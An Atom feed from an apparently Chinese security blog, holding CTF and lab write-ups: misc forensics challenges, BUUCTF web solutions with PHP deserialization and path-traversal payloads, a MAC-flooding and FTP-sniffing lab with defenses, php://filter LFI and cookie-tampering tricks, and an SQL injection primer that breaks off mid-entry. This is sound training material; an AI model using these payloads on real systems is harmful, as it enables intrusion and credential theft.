<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>亖 玖</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-04-12T12:25:56.988Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>亖 玖</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021DCN杂项wp</title>
    <link href="http://yoursite.com/2021/04/12/2021DCN%E6%9D%82%E9%A1%B9wp/"/>
    <id>http://yoursite.com/2021/04/12/2021DCN%E6%9D%82%E9%A1%B9wp/</id>
    <published>2021-04-12T07:16:06.442Z</published>
    <updated>2021-04-12T12:25:56.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1uGwj60dlCXCMDSp4-bblMw" target="_blank" rel="noopener">提取码：2021</a></p><p><img src="https://cdn.sijiu.ren/blog/20210412/WktwTQzi2q3D.png?imageslim" alt="mark"></p><p>1.</p><p><img src="https://cdn.sijiu.ren/blog/20210412/d8lw6pTmBXF6.png?imageslim" alt="mark"></p><p>下载下来是一个名为1.CAM的jpg文件，使用记事本打开即可获得flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/BU8zJbmQt4CW.png?imageslim" alt="mark"></p><p>2.</p><p><img src="https://cdn.sijiu.ren/blog/20210412/bD2K3rLSIrvB.png?imageslim" alt="mark"></p><p>下载下来是一个名为2.hex的jpg文件，使用winhex打开拉到最后即可得到flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/Czw3tqhhzoW5.png?imageslim" alt="mark"></p><p>3.</p><p>下载下来是一个名为3.zip的jpg文件，修改后缀为zip解压文件得到flag文件</p><p><img src="https://cdn.sijiu.ren/blog/20210412/liMDIx7jOgr0.png?imageslim" alt="mark"></p><p>4.</p><p>下载下来是一个名为4.four的zip文件，解压需要密码</p><p>使用文档密码爆破工具爆破范围设置3-4位 小写字母加数字</p><p><img src="https://cdn.sijiu.ren/blog/20210412/Iw6vmm8fOzxr.png?imageslim" alt="mark"></p><p>使用密码解压得到flag文件</p><p>5.</p><p>下载下来是一个名为5的docx文件，修改后缀为zip解压得到一个名为眼见非实的文件夹</p><p><img src="https://cdn.sijiu.ren/blog/20210412/owd3xlXJf20Q.png?imageslim" alt="mark"></p><p>在解压下来的文件夹中找到document.xml文件，打开即可获得flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/iTFSCcPDSG7H.png?imageslim" alt="mark"></p><p>6.</p><p>下载下来是一个名为6.wireshark的pcap文件，使用wireshark打开</p><p>查找http流，获得flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/QhnqtCuifsY3.png?imageslim" alt="mark"></p><p>7.</p><p>下载下来是一个名为7.ping的pcap文件，使用wireshark打开</p><p>icmp过滤</p><p><img src="https://cdn.sijiu.ren/blog/20210412/yiRz9ql2FmYy.png?imageslim" alt="mark"></p><p>因为icmp无法追踪数据流所以得一个个查看icmp数据流拼凑出flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/tAkExHyoRmwW.png?imageslim" alt="mark"></p><p>8.</p><p>下载下来是一个名为8的docx文件，修改后缀为zip解压得到以下文件</p><p><img src="https://cdn.sijiu.ren/blog/20210412/hlHJrX2K5wk9.png?imageslim" alt="mark"></p><p>进入docProps文件夹打开custom.xml文件即可获得flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/XirrPivYFyUH.png?imageslim" alt="mark"></p><p>9.</p><p>下载下来是一个名为9.TLS的zip文件，解压该文件得到一个名为Misc5的文件夹</p><p><img src="https://cdn.sijiu.ren/blog/20210412/59kMOwLYLySP.png?imageslim" alt="mark"></p><p>使用wireshark打开client.pcap过滤tls</p><p><img src="https://cdn.sijiu.ren/blog/20210412/tRV40GtqQb7L.png?imageslim" alt="mark"></p><p>右击追踪流–》tcp流 得到flag</p><p><img src="https://cdn.sijiu.ren/blog/20210412/osU39j0UyMpD.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://pan.baidu.com/s/1uGwj60dlCXCMDSp4-bblMw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;提取码：2021&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.sijiu.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>BUUweb笔记</title>
    <link href="http://yoursite.com/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2021/03/17/BUUweb%E7%AC%94%E8%AE%B0/</id>
    <published>2021-03-17T06:38:32.040Z</published>
    <updated>2021-03-17T08:36:16.705Z</updated>
    
    <content type="html"><![CDATA[<p>BUU的做题笔记</p><h2 id="BUU-CODE-REVIEW-11传送门"><a href="#BUU-CODE-REVIEW-11传送门" class="headerlink" title="BUU CODE REVIEW 11传送门"></a>BUU CODE REVIEW 11<a href="https://buuoj.cn/challenges#BUU%20CODE%20REVIEW%201" target="_blank" rel="noopener">传送门</a></h2><p><img src="https://cdn.sijiu.ren/blog/20210317/10do5cxYd1Oz.png?imageslim" alt="mark"></p><p>审计代码可以发现想要得到flag必须满足</p><p>1.pleaseget等于1</p><p>2.pleasepost等于2</p><p>3.md51和md52的md5值相等且md51和md52的值不相等</p><p>4.反序列化obj</p><p>payload</p><pre><code>pleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:{s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;}</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/8iIQ4dsta4yl.png?imageslim" alt="mark"></p><p>序列化构造方法</p><p><img src="https://cdn.sijiu.ren/blog/20210317/qoSXaVobPpNb.png?imageslim" alt="mark"></p><h2 id="HCTF-2018-WarmUp1-传送门"><a href="#HCTF-2018-WarmUp1-传送门" class="headerlink" title="[HCTF 2018]WarmUp1 传送门"></a>[HCTF 2018]WarmUp1 <a href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp" target="_blank" rel="noopener">传送门</a></h2><p>查看页面源代码</p><p><img src="https://cdn.sijiu.ren/blog/20210317/4TB8EL2NzUSl.png?imageslim" alt="mark"></p><p>访问source.php</p><p><img src="https://cdn.sijiu.ren/blog/20210317/Q7krkxpQt722.png?imageslim" alt></p><p><img src="https://cdn.sijiu.ren/blog/20210317/0g9lh2e5eCM9.png?imageslim" alt></p><p>查看源码</p><pre><code>! empty //要求变量不为空is_string  //要求传参的数值为字符型的emmm::checkFile //将传递进来的值传到emmm这个类的checkFile这个函数里</code></pre><p>总结就是传参进来的file为字符型就引用这个数值的文件否则就是执行图片代码</p><p>接下来看emmm类里的checkFile函数</p><pre><code>! isset //要求传递的变量存在!is_string //要求为字符串in_array($page, $whitelist) //要求传递进来的值与$whitelist的值匹配mb_substr($page,0,mb_strpos($page . &#39;?&#39;, &#39;?&#39;)) //取传递进来的值的第一位开始到出现?结束如果没?则全部</code></pre><p>可以看到$whitelist的值只有source.php和hint.php</p><p>访问</p><pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/source.php/?file=hint.php</code></pre><p>得到提示</p><p><img src="https://cdn.sijiu.ren/blog/20210317/WnP6YJJMPaRY.png?imageslim" alt="mark"></p><p>flag在ffffllllaaaagggg里面</p><p>构造获取flag的语句</p><p>payload </p><pre><code>http://c3a077b0-eb2a-4aed-99af-463e018bd390.node3.buuoj.cn/?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="https://cdn.sijiu.ren/blog/20210317/5N3CLF6OeAnK.png?imageslim" alt="mark"></p><p>虽然在checkFile函数中对file的值进行了一系列处理，但是并没有影响到file真正的值，因为在使用处理后的file进行白名单匹配的时候，都是使用了一个新的变量接受file的值，而并没有直接影响file本来的值，所以file的值依旧为</p><pre><code>file=hint.php?../../../../../ffffllllaaaagggg</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;BUU的做题笔记&lt;/p&gt;
&lt;h2 id=&quot;BUU-CODE-REVIEW-11传送门&quot;&gt;&lt;a href=&quot;#BUU-CODE-REVIEW-11传送门&quot; class=&quot;headerlink&quot; title=&quot;BUU CODE REVIEW 11传送门&quot;&gt;&lt;/a&gt;BUU COD
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Mac泛洪攻击与监听</title>
    <link href="http://yoursite.com/2021/03/16/Mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E4%B8%8E%E7%9B%91%E5%90%AC/"/>
    <id>http://yoursite.com/2021/03/16/Mac%E6%B3%9B%E6%B4%AA%E6%94%BB%E5%87%BB%E4%B8%8E%E7%9B%91%E5%90%AC/</id>
    <published>2021-03-16T07:02:50.950Z</published>
    <updated>2021-03-16T07:03:26.356Z</updated>
    
    <content type="html"><![CDATA[<h5 id="本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。"><a href="#本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。" class="headerlink" title="本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。"></a>本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。</h5><h3 id="演示环境"><a href="#演示环境" class="headerlink" title="演示环境"></a>演示环境</h3><table><thead><tr><th>主机</th><th>角色</th><th>IP地址</th></tr></thead><tbody><tr><td>BT5R3 虚拟机</td><td>攻击机</td><td>192.168.198.137</td></tr><tr><td>Centos 7 虚拟机</td><td>连接FTP服务器</td><td>192.168.198.240</td></tr><tr><td>WindowsXP-sp2 虚拟机</td><td>FTP服务器</td><td>192.168.198.134</td></tr></tbody></table><p>三台虚拟机安装在VMware中，网络连接使用NAT模式</p><h3 id="Mac泛洪攻击原理"><a href="#Mac泛洪攻击原理" class="headerlink" title="Mac泛洪攻击原理"></a>Mac泛洪攻击原理</h3><p>泛洪攻击的目标就是想获取主机之间的通信数据。要想达到这个目的，就需要强迫交换机进行数据广播，那就要实现 Mac 表中没有目标主机 的 Mac 和端口绑定。泛洪攻击的实现方法就是通过<strong>伪造大量的未知 Mac 地址进行通信</strong>，交换机进行不断的学习，很快 Mac 表就会被充满，这样正常的主机的 Mac 地址在经过老化之后，就无法再添加到 Mac 地址表中，导致之后交换机的数据都变成了广播。</p><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><h5 id="1-在windowsxp-sp2搭建FTP服务器"><a href="#1-在windowsxp-sp2搭建FTP服务器" class="headerlink" title="1.在windowsxp-sp2搭建FTP服务器"></a>1.在windowsxp-sp2搭建FTP服务器</h5><p><img src="https://cdn.sijiu.ren/blog/20210316/fMBYl05c2RkT.png?imageslim" alt="mark"></p><h5 id="2-在Centos-7访问FTP服务器"><a href="#2-在Centos-7访问FTP服务器" class="headerlink" title="2.在Centos 7访问FTP服务器"></a>2.在Centos 7访问FTP服务器</h5><p><img src="https://cdn.sijiu.ren/blog/20210316/Nog2w3xNccRI.png?imageslim" alt="mark"></p><h5 id="3-在攻击机上执行命令macof，通过eth2向交换机发送大量伪造的Mac数据包"><a href="#3-在攻击机上执行命令macof，通过eth2向交换机发送大量伪造的Mac数据包" class="headerlink" title="3.在攻击机上执行命令macof，通过eth2向交换机发送大量伪造的Mac数据包"></a>3.在攻击机上执行命令macof，通过eth2向交换机发送大量伪造的Mac数据包</h5><p><img src="https://cdn.sijiu.ren/blog/20210316/FEfS9XmKJ8nV.png?imageslim" alt="mark"></p><h5 id="4-同时打开wireshark监听eth2网卡的FTP通信"><a href="#4-同时打开wireshark监听eth2网卡的FTP通信" class="headerlink" title="4.同时打开wireshark监听eth2网卡的FTP通信"></a>4.同时打开wireshark监听eth2网卡的FTP通信</h5><h6 id="centos-7-重新访问FTP服务器然后返回攻击机可以发现wireshark记录了账号和密码"><a href="#centos-7-重新访问FTP服务器然后返回攻击机可以发现wireshark记录了账号和密码" class="headerlink" title="centos 7 重新访问FTP服务器然后返回攻击机可以发现wireshark记录了账号和密码"></a>centos 7 重新访问FTP服务器然后返回攻击机可以发现wireshark记录了账号和密码</h6><p><img src="https://cdn.sijiu.ren/blog/20210316/aGTSvi7jJIfE.png?imageslim" alt="mark"></p><p>本次实验记录结束</p><p><strong>防御 Mac 泛洪攻击的措施：</strong></p><ol><li>限定交换机接入的端口的mac数量，一般高级的交换机都有这项功能。例如：设置交换机某端口最多学习 8个 Mac 地址，如果超过了 8个 Mac 地址就停止学习，自动丢弃后来的 Mac 地址。</li><li>从主机管理员的日常运维角度来说，主机应禁用 FTP、Telnet 等明文传输数据的不安全通讯协议，可使用 SFTP、SSH 协议替代。</li><li>从网站服务器开发者的角度来说，应对用户的敏感信息进行加密后再进行传输，最好直接使用HTTPS协议，而对于使用HTTP协议通信的站点，至少对用户的账号密码等敏感信息在前端做下加密后再传输。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h5 id=&quot;本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。&quot;&gt;&lt;a href=&quot;#本文记录了用虚拟机如何在局域网内对交换机进行Mac泛洪攻击，对FTP通信进行流量监听并获取帐户密码的攻击目的。&quot; class=&quot;h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTFweb笔记</title>
    <link href="http://yoursite.com/2020/11/21/CTFweb%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/21/CTFweb%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-21T00:48:43.676Z</published>
    <updated>2020-12-16T09:40:39.907Z</updated>
    
    <content type="html"><![CDATA[<hr><hr><p>本地靶机里的题目笔记</p><p>如果地址不可访问请联系我开启映射</p><p><a href="http://qq1012482327.w3.luyouxia.net/" target="_blank" rel="noopener">传送门</a></p><p>web1</p><p><img src="http://cdn.sijiu.ren/blog/20201121/ujfKUYqSEWSe.png?imageslim" alt="mark"></p><p>右击查看页面源代码发现flag</p><p><img src="http://cdn.sijiu.ren/blog/20201121/vUzyR9WbOXzD.png?imageslim" alt="mark"></p><hr><p>web2</p><p><img src="http://cdn.sijiu.ren/blog/20201121/gg78JNmpgff1.png?imageslim" alt="mark"></p><p>打开发现index.php被重定向到index.html</p><p>打开Burp抓包</p><p><img src="http://cdn.sijiu.ren/blog/20201121/cRw84HOUQzbu.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web3</p><p><img src="http://cdn.sijiu.ren/blog/20201121/iTauWecNG3P8.png?imageslim" alt="mark"></p><p>只允许通过本地地址进行访问</p><p>使用Burp添加</p><pre><code>x-forwarded-for: 127.0.0.1</code></pre><p>伪造ip地址</p><p><img src="http://cdn.sijiu.ren/blog/20201121/7wn7ew5LHB8P.png?imageslim" alt="mark"></p><p>提示不是管理员</p><p>尝试把Cookie的isadmin的0改为1</p><p><img src="http://cdn.sijiu.ren/blog/20201121/Immuo7M7dkXe.png?imageslim" alt="mark"></p><p>得到flag</p><p><img src="http://cdn.sijiu.ren/blog/20201121/Uu2S9VqJSFYQ.png?imageslim" alt="mark"></p><hr><p>web4</p><p><img src="http://cdn.sijiu.ren/blog/20201121/6ICcXo5VWj0q.png?imageslim" alt="mark"></p><p>御剑扫一下后台</p><p><img src="http://cdn.sijiu.ren/blog/20201121/6KRiXqyhYKlv.png?imageslim" alt="mark"></p><p>发现.bak文件</p><p><img src="http://cdn.sijiu.ren/blog/20201121/agMWbwzrTrcV.png?imageslim" alt="mark"></p><p>GET传参ver等于php版本号得flag</p><p>php版本号可以通过查看响应头获得</p><p><img src="http://cdn.sijiu.ren/blog/20201121/TEwTnrnKFktL.png?imageslim" alt="mark"></p><p>在url后面加上?ver=5.4.41</p><p><img src="http://cdn.sijiu.ren/blog/20201121/5yGCaj64ex43.png?imageslim" alt="mark"></p><p>得到flag</p><p><img src="http://cdn.sijiu.ren/blog/20201121/3k1OExQRCGh2.png?imageslim" alt="mark"></p><hr><p>web5</p><p><img src="http://cdn.sijiu.ren/blog/20201127/qTd9VRgBB74f.png?imageslim" alt="mark"></p><p>看一下源代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/p47fN4QB9Dks.png?imageslim" alt="mark"></p><p>提示password.txt 查看一下这个文件</p><p><img src="http://cdn.sijiu.ren/blog/20201127/fAp0hEzc3sHs.png?imageslim" alt="mark"></p><p>复制这个字典用Burp爆破看看</p><p><img src="http://cdn.sijiu.ren/blog/20201127/l4Bgn08JUuMp.png?imageslim" alt="mark"></p><p>得到密码</p><p>在网页输入密码发现最多只能输入五位</p><p>按F12调出开发者工具在查看器修改maxlength=”5”删除5即可解除输入限制</p><p><img src="http://cdn.sijiu.ren/blog/20201127/O5Pd3k3m4xD8.png?imageslim" alt="mark"></p><p>输入密码提示这里没有flag</p><p><img src="http://cdn.sijiu.ren/blog/20201127/CkdSwTBP3TGQ.png?imageslim" alt="mark"></p><p>查看源代码没发现什么提示，查看响应头发现一串Cookie数值</p><p><img src="http://cdn.sijiu.ren/blog/20201127/fJ31qpvNgvdp.png?imageslim" alt="mark"></p><p>base64解码得到</p><p><img src="http://cdn.sijiu.ren/blog/20201127/gPzqRNkAUBwF.png?imageslim" alt="mark"></p><p>访问这个页面</p><p><img src="http://cdn.sijiu.ren/blog/20201127/3ErHYB0n3qIq.png?imageslim" alt="mark"></p><p>输入信息留言</p><p><img src="http://cdn.sijiu.ren/blog/20201127/jcKtoPB1Vwfm.png?imageslim" alt="mark"></p><p>提示未登录</p><p>抓包看看传输的数据</p><p><img src="http://cdn.sijiu.ren/blog/20201127/q3yx02mLsdjt.png?imageslim" alt="mark"></p><p>修改Cookie的lsLogin为1</p><p><img src="http://cdn.sijiu.ren/blog/20201127/u35ELTzT4jmn.png?imageslim" alt="mark"></p><p>留言成功，但提示没有权限访问</p><p>抓包修改userlevel字段的guest更改为root</p><p><img src="http://cdn.sijiu.ren/blog/20201127/8G5FfYbDX763.png?imageslim" alt="mark"></p><p><img src="http://cdn.sijiu.ren/blog/20201127/LePHsQ4eOCop.png?imageslim" alt="mark"></p><p>以root帐户留言成功</p><p>查看响应头</p><p><img src="http://cdn.sijiu.ren/blog/20201127/CLFXJ9cDbNLs.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web6</p><p><img src="http://cdn.sijiu.ren/blog/20201127/BfzORSg7LwPW.png?imageslim" alt="mark"></p><p>代码审计</p><p>通过GET传参md5的数值</p><p>传参的数值不能等于240610708并且传参的md5值要与240610708的md5值相等</p><p><img src="http://cdn.sijiu.ren/blog/20201127/TjI5CD0osg7O.png?imageslim" alt="mark"></p><p>PHP接收0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。所以我们只需要输入一个数字和字符串进行MD5加密之后都为0e的即可得出答案。</p><p>240610708的md5值是0e开头的所以传参一个md5值0e开头的数值即可绕过</p><p>0e开头的md5和原值：<br><strong>QNKCDZO</strong><br> 0e830400451993494058024219903391<br><strong>240610708</strong><br> 0e462097431906509019562988736854<br><strong>s878926199a</strong><br> 0e545993274517709034328855841020<br><strong>s155964671a</strong><br> 0e342768416822451524974117254469</p><p><img src="http://cdn.sijiu.ren/blog/20201127/aVGwt3RTm11a.png?imageslim" alt="mark"></p><hr><p>web7</p><p><img src="http://cdn.sijiu.ren/blog/20201127/98k2deuTj2Po.png?imageslim" alt="mark"></p><p>PHP代码审计</p><p>要求解密加密的代码</p><p>解密脚本如下</p><pre><code class="php">&lt;?php$s=&#39;=pJovuTsWOUrtIJZtcKZ2OJMzEJZyMTLdIas&#39;;function unencode($str){  $o=&#39;&#39;;  $a=base64_decode(strrev(str_rot13($str)));  echo $a.&quot;\n&quot;;  //$a=str_rot13(strrev(base64_decode($str)));  //echo strlen($a);  for ($i=0;$i&lt;strlen($a);$i++){    $bbb = substr($a,$i,1);    //echo $bbb.&#39;\n&#39;;    $ddd=ord($bbb)-1;    $l=chr($ddd);    //echo $l.&#39;\n&#39;;    $o=$o.$l;  }  echo strrev($o);}unencode($s);?&gt;</code></pre><p><a href="https://www.dooccn.com/php5.5/" target="_blank" rel="noopener">在线运行代码网站</a></p><p><img src="http://cdn.sijiu.ren/blog/20201127/pnszl5DMIo2C.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web8</p><p><img src="http://cdn.sijiu.ren/blog/20201127/09MtIWt87qAM.png?imageslim" alt="mark"></p><p>查看源代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/HE4EuBBq4GTe.png?imageslim" alt="mark"></p><p>发现js文件</p><p><a href="https://www.html.cn/tool/js_beautify/" target="_blank" rel="noopener">在线美化js网站</a></p><p>美化js源代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/v78KkWrtYzjj.png?imageslim" alt="mark"></p><p>美化后发现unescape内有代码</p><p>美化unescaoe 内的代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/oYWKY2UObxmn.png?imageslim" alt="mark"></p><p>将js的判断语句和数值放在控制台运行得出账号密码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/2ODlVBChtYsM.png?imageslim" alt="mark"></p><p><img src="http://cdn.sijiu.ren/blog/20201127/jr4KRiPzruik.png?imageslim" alt="mark"></p><p>继续美化得到的unescaoe内的代码里的unescape里的代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/HxC2q3WxGqRr.png?imageslim" alt="mark"></p><p><img src="http://cdn.sijiu.ren/blog/20201127/pTxHlRDVMVE8.png?imageslim" alt="mark"></p><p>base64解码得到</p><p><a href="https://base64.supfree.net/" target="_blank" rel="noopener">在线base64解码网站</a></p><p><img src="http://cdn.sijiu.ren/blog/20201127/hw8WWG6oYQEI.png?imageslim" alt="mark"></p><p>访问解码得到的页面</p><p><img src="http://cdn.sijiu.ren/blog/20201127/SGimm8NLJLAU.png?imageslim" alt="mark"></p><p>访问Ch3ck_Au7h.php页面</p><p><img src="http://cdn.sijiu.ren/blog/20201127/tXmTG1lbwLgq.png?imageslim" alt="mark"></p><p>传入之前得到的账号密码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/YN50GI6k9jzJ.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web9</p><p><img src="http://cdn.sijiu.ren/blog/20201127/YhUSMhrflCnn.png?imageslim" alt="mark"></p><p>查找QQ然后访问空间要求输入生日，输入提示的生日</p><p><img src="http://cdn.sijiu.ren/blog/20201127/WusX5KVeiMX4.png?imageslim" alt="mark"></p><p>空间说说就一条</p><p><img src="http://cdn.sijiu.ren/blog/20201127/X8sQ52J8Qnby.png?imageslim" alt="mark"></p><p>试试这个密码</p><p>输入密码发现无法输入，F12查看源代码</p><p><img src="http://cdn.sijiu.ren/blog/20201127/Y533Vp4vqEKv.png?imageslim" alt="mark"></p><p>删掉readonly=””就可以输入了</p><p><img src="http://cdn.sijiu.ren/blog/20201127/Rxnwze6Egltx.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web10</p><p><img src="http://cdn.sijiu.ren/blog/20201129/WAcBveaat0N3.png?imageslim" alt="mark"></p><p>查看页面源代码</p><p><img src="http://cdn.sijiu.ren/blog/20201129/jtoV6ByuWhS5.png?imageslim" alt="mark"></p><p>提示LFI本地文件包含</p><p>在提交页面框中输入</p><pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>利用LFI来查看base64加密的源码</p><p><img src="http://cdn.sijiu.ren/blog/20201129/S4PbVy8lMSSq.png?imageslim" alt="mark">base64解码</p><p><img src="http://cdn.sijiu.ren/blog/20201129/8VUpSOo6Bv2C.png?imageslim" alt="mark"></p><p>得到flag</p><hr><p>web11</p><p><img src="http://cdn.sijiu.ren/blog/20201129/QKQTGklVkb20.png?imageslim" alt="mark"></p><p>信息收集时发现.swp文件泄露。直接访问</p><p><img src="http://cdn.sijiu.ren/blog/20201211/HlwPPJLH16V7.png?imageslim" alt="mark"></p><p>打开文件代码审计一下</p><pre><code class="php">&lt;!--function clear($string){  //这是过滤函数哦~}$userInfo = @unserialize($_REQUEST[&#39;userInfo&#39;]);$query = &#39;SELECT * FROM users WHERE id = \&#39;&#39;.clear($userInfo[&#39;id&#39;]).&#39;\&#39; AND password = \&#39;&#39;.clear($userInfo[&#39;pass&#39;]).&#39;\&#39;;&#39;;$result = mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1){    die(&#39;Invalid password!&#39;);}$row = mysql_fetch_assoc($result);foreach($row as $key =&gt; $value){    $userInfo[$key] = $value;}$oldPass = @$_REQUEST[&#39;oldPass&#39;];$newPass = @$_REQUEST[&#39;newPass&#39;];if($oldPass == $userInfo[&#39;password&#39;]){    $userInfo[&#39;password&#39;] = $newPass;    $query = &#39;UPDATE users SET pass = \&#39;&#39;.clear($newPass).&#39;\&#39; WHERE id = \&#39;&#39;.clear($userInfo[&#39;id&#39;]).&#39;\&#39;;&#39;;    mysql_query($query);    echo &#39;Password Changed Success.&lt;br&gt;&#39;;}else{    echo &#39;Invalid old password entered.&#39;;}--&gt;</code></pre><p>反序列化userInfo这个传参变量通过userInfo查询变量里的id和pass</p><p>查看页面的cookies可以得到id和加密过的pass</p><p><img src="http://cdn.sijiu.ren/blog/20201211/EOhVQq1V76D8.png?imageslim" alt="mark"></p><p>将pass数值base64解密在md5解密得出未加密的密码20151231</p><p><img src="http://cdn.sijiu.ren/blog/20201211/q7n9j6lTMeJY.png?imageslim" alt="mark"></p><p>构造序列化userInfo</p><p><img src="http://cdn.sijiu.ren/blog/20201211/8K1paUrH0wgb.png?imageslim" alt="mark"></p><p>得到payload</p><pre><code>a:2:{s:2:&quot;id&quot;;s:1:&quot;3&quot;;s:4:&quot;pass&quot;;s:8:&quot;20151231&quot;;}</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201211/rNJ6jOxBPJ76.png?imageslim" alt="mark"></p><p><img src="http://cdn.sijiu.ren/blog/20201211/W4TNdxDoC1qB.png?imageslim" alt="mark"></p><p>传递oldPass和newPass使oldPass和pass相等</p><p>构造oldPass=20151231&amp;newPass=123456</p><p>最终payload</p><pre><code class="php">a:2：{s:2:&quot;id&quot;;s:1:&quot;3&quot;;s:4:&quot;pass&quot;;s:8:&quot;20151231&quot;;}&amp;oldPass=20151231&amp;newpass=123456</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201211/zhSRO2HfwrVv.png?imageslim" alt="mark"></p><p>得到flag</p><p>web12</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;hr&gt;
&lt;p&gt;本地靶机里的题目笔记&lt;/p&gt;
&lt;p&gt;如果地址不可访问请联系我开启映射&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://qq1012482327.w3.luyouxia.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;传送门&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>sql注入之显错注入</title>
    <link href="http://yoursite.com/2020/10/23/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2020/10/23/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2020-10-23T02:11:16.931Z</published>
    <updated>2020-10-23T02:31:46.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入之显错注入"><a href="#SQL注入之显错注入" class="headerlink" title="SQL注入之显错注入"></a>SQL注入之显错注入</h1><p>[TOC]</p><h1 id="注入本质？"><a href="#注入本质？" class="headerlink" title="注入本质？"></a>注入本质？</h1><p>1、 SQL显错注入是最常见的注入。</p><p>2、 注入攻击的本质，是把用户输入的数据当做SQL语句执行。</p><p>3、 这里有两个关键条件：</p><p>第一个是用户能够控制输入。</p><p>第二个是原本程序要执行的代码，拼接了用户输入的数据，然后进行执行。</p><h2 id="渗透测试常用函数。"><a href="#渗透测试常用函数。" class="headerlink" title="渗透测试常用函数。"></a>渗透测试常用函数。</h2><p>1、 GROUP_CONCAT(col)：返回由属于一组的列值连接组合而成的结果。</p><p>　　例如：id=9.9 union select 1,GROUP_CONCAT(table_name) from information_schema.tables where table_schema=database()</p><p>　　可以把所有内容输出到同一页面，并且以逗号分隔(admin,dirs,news,xss)</p><p>2、 ASCII(char)：盲注用，返回字符的ASCII码值。</p><p>3、 DATABASE()：返回当前数据库名。</p><p>4、 USER()或SYSTEM_USER()：返回当前登陆用户名。</p><p>　　例如：字段2，回显2，有id=9.9 union select 1,USER()。</p><p>5、 VERSION()：返回MySQL服务器的版本。</p><p>　　例如：字段2，回显2，有id=9.9 union select 1,VERSION()。</p><p>6、 SLEEP(n)：休眠n秒。</p><h2 id="小知识点。"><a href="#小知识点。" class="headerlink" title="小知识点。"></a>小知识点。</h2><p>1、 要分清 ‘ (引号)和 `(反引号)。</p><p>2、 在PHP中 `(反引号)可以执行CMD语句。</p><p>　　例如：在php中写一句 echo `whoami` ,然后再网页中打开的话，会返回如同CMD中执行的结果。</p><p>3、 `(反引号)在JS中可以代替(’ 。</p><p>　　例如：&lt;script&gt;alert(‘非法注入！’)&lt;/script&gt;</p><p>　　　　   &lt;script&gt;alert`非法注入！`&lt;/script&gt;</p><p>4、 联合查询的使用条件：</p><p>　　1）字段数相等。</p><p>　　2）字段类型相同。</p><h2 id="SQL注入易错回答分析"><a href="#SQL注入易错回答分析" class="headerlink" title="SQL注入易错回答分析"></a>SQL注入易错回答分析</h2><p>1、 sql注入本质是什么?</p><p>　　